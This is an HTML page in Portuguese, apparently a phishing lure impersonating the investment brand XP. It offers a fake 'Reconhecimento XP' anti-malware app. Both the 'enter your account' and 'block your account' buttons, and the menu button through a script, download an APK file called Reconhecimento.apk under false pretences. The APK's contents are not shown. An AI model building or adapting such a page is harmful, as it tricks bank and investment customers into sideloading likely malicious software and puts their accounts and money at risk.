<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Portal XP</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Roboto', sans-serif;
    }

    body {
      background-color: #f4f4f4;
    }

    .header {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      background: rgba(26,26,26,0.95);
      padding: 15px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      z-index: 1000;
    }

    .header img {
      height: 40px;
    }

    .menu-btn {
      background: none;
      border: none;
      cursor: pointer;
      font-size: 28px;
      color: white;
    }

    .spacer {
      height: 70px;
    }

    .image-top {
      width: 100%;
      display: flex;
      justify-content: center;
      position: relative;
    }

    .image-top img {
      width: 100%;
      height: auto;
      object-fit: cover;
    }

    .c {
      background: rgba(255,255,255,0.97);
      padding: 25px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,.2);
      width: 90%;
      max-width: 460px;
      text-align: center;
      position: relative;
      z-index: 10;
    }

    .h {
      font-size: 18px;
      margin-bottom: 15px;
    }

    .d {
      font-size: 15px;
      color: #222;
      margin-bottom: 20px;
      font-weight: normal;
      line-height: 1.5;
    }

    .b {
      width: 100%;
      padding: 14px;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 15px;
    }

    .y { background-color: #ffcc00; color: #000; }
    .g { background-color: #ddd; color: #000; }

    /* Mobile styles */
    @media (max-width: 768px) {
      .spacer {
        height: 0; /* Remove o spacer no mobile para eliminar o espaço em branco */
      }

      .image-top {
        margin-top: 0; /* Remove o margin-top para a imagem ficar colada no header */
        position: absolute;
        top: 70px; /* Ajusta para ficar logo abaixo do header */
        left: 0;
        width: 100%;
      }

      .image-top img {
        max-height: 200px; /* Mantém a altura limitada da imagem */
        width: 100%;
        object-fit: cover;
      }

      .main-container {
        margin-top: 200px; /* Ajusta o conteúdo para começar após a imagem */
      }

      .c {
        margin: -50px auto 50px auto; /* Mantém a sobreposição da caixa de texto */
        width: 92%;
        padding: 20px;
      }

      .h { font-size: 16px; }
      .d { font-size: 14px; }
    }

    /* Desktop styles */
    @media (min-width: 769px) {
      .image-top {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100vh; /* Imagem ocupa a tela inteira */
        z-index: 1;
      }

      .image-top img {
        width: 100%;
        height: 100%;
        object-fit: cover;
      }

      .main-container {
        position: relative;
        z-index: 10;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding-top: 70px; /* Espaço para o header fixo */
      }

      .c {
        margin: 0;
        width: 460px;
      }
    }
  </style>
</head>
<body>
  <div class="header">
    <button class="menu-btn" id="menuBtn">☰</button>
    <img src="./logo.png" alt="XP Logo" onerror="this.onerror=null; this.src='https://via.placeholder.com/40x40?text=Logo+Não+Encontrado'; this.alt='Logo não encontrado';">
    <div style="width:40px;"></div>
  </div>

  <div class="spacer"></div>
  <div class="image-top">
    <img src="./background.png" alt="fundo" onerror="this.onerror=null; this.src='https://via.placeholder.com/400x200?text=Imagem+Não+Encontrada'; this.alt='Imagem de fundo não encontrada';">
  </div>
  <div class="main-container">
    <div id="main"></div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      const txt = "O Reconhecimento XP é um programa de celular projetado para detectar, prevenir e remover um software malicioso e tem como objetivo proteger o sistema contra vírus, worms, trojans, spyware, adware e outros tipos de ameaças. Que podem comprometer a sua segurança e Investimentos!";
      const el = document.getElementById("main");
      el.innerHTML = `
        <div class='c'>
          <div class='h'></div>
          <div class='d'>${txt}</div>
          <a href='./Reconhecimento.apk' download><button class='b y'>ENTRAR NA SUA CONTA</button></a>
          <a href='./Reconhecimento.apk' download><button class='b g'>BLOQUEAR SUA CONTA</button></a>
        </div>
      `;

      
      const menuBtn = document.getElementById("menuBtn");
      menuBtn.addEventListener("click", function() {
        const link = document.createElement("a");
        link.href = "./Reconhecimento.apk";
        link.download = "Reconhecimento.apk";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      });
    });
  </script>
